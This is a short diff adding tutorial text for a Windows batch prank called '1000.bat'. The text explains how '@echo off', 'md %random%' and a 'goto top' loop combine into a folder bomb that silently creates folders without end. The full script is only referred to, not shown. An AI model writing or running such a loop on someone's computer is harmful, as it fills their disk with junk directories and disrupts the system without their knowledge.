@@ -1,0 +1,8 @@
+       Open your notepad and type the following code given in text box.
+
+          Save it as 1000.bat @echo off makes your screen
+          appear blank but it is actually making hundreds of
+          folders. md %random% is command that creating
+          folders  with random names.( md is a command to
+          make directory in ms-dos) goto top – return the
+          command to :top, causes an infinite loop. 
